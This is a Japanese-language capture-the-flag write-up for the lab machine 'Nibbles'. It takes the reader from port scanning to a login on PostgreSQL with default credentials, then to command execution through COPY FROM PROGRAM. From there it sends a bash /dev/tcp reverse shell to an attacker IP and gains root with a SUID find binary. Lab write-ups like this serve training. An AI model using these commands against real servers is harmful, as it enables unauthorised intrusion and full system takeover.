+++
title = "Proving Grounds Practice - Nibbles Writeup"
date = "2026-10-14"
description = "PostgreSQLへroot権限でログインし、COPY FROM PROGRAMによるリモートコマンド実行でシェルを取得、SUIDが付与されたfindバイナリを悪用してroot権限に昇格"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[PostgreSQL COPY FROM PROGRAM RCE]", "[SUID find privesc]", "[Intermediate]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Nibbles |
| OS | Linux |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC -p- 192.168.145.47
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-13 23:07 +0900
Nmap scan report for 192.168.145.47
Host is up (0.085s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE  SERVICE      VERSION
21/tcp   open   ftp          vsftpd 3.0.3
22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp   open   http         Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Enter a title, displayed at the top of the window.
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-27T15:41:47
|_Not valid after:  2030-04-25T15:41:47
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.93 seconds
```

標準のftp/ssh/httpに加え、非標準ポート5437でPostgreSQL 11系が稼働していることを確認。

---

## Exploit

### PostgreSQLへのログインと情報収集
初期パスワードpostgres：postgres
```bash
psql -h 192.168.145.47 -U postgres -p 5437
```

postgresユーザーで認証に成功。

```text
postgres=# SELECT current_user;
 current_user 
--------------
 postgres
(1 row)

postgres=# SELECT current_database();
 current_database 
------------------
 postgres
(1 row)

postgres=# SHOW data_directory;
       data_directory        
-----------------------------
 /var/lib/postgresql/11/main
(1 row)
```

`pg_read_file`を使い、`/etc/passwd`を読み取ってローカルユーザーを列挙。

```sql
SELECT * FROM pg_read_file('/etc/passwd');
```

```text
root:x:0:0:root:/root:/bin/bash
...
wilson:x:1000:1000:wilson,,,:/home/wilson:/bin/bash
postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
...
```

### COPY FROM PROGRAM によるリモートコマンド実行

PostgreSQLのsuperuser権限を利用し、`COPY ... FROM PROGRAM`でOSコマンドを実行できることを確認。

```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

```text
                               cmd_output                               
------------------------------------------------------------------------
 uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
(1 row)
```

RCEが成立していることを確認後、reverse shellを送信。

```sql
COPY cmd_exec FROM PROGRAM '/usr/bin/bash -c "/usr/bin/bash -i >& /dev/tcp/192.168.45.173/80 0>&1"';
```

攻撃側でリスナーを起動していたところ、接続を確立。

```bash
nc -lvnp 80
```

```text
listening on [any] 80 ...
connect to [192.168.45.173] from (UNKNOWN) [192.168.145.47] 33016
bash: cannot set terminal process group (1487): Inappropriate ioctl for device
bash: no job control in this shell
postgres@nibbles:/var/lib/postgresql/11/main$ whoami
postgres
```

postgresユーザーとしてシェルを取得。

### 権限昇格: SUIDが付与されたfindの悪用

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/find
/usr/bin/sudo
/usr/bin/umount
```

`/usr/bin/find`に通常では付与されないSUIDビットが立っていることを確認。GTFOBinsのfindエントリに従い、SUID経由でroot権限のシェルを取得。

```bash
find / -user root -perm -4000 -exec /bin/sh -p \; -quit
```

```text
whoami
root
```

---

## Summary

PostgreSQL (5437) にpostgres/postgresで認証 → `COPY FROM PROGRAM`によるRCEでpostgresユーザーのシェルを取得 → SUIDが付与された`/usr/bin/find`をGTFOBins通りに悪用 → root
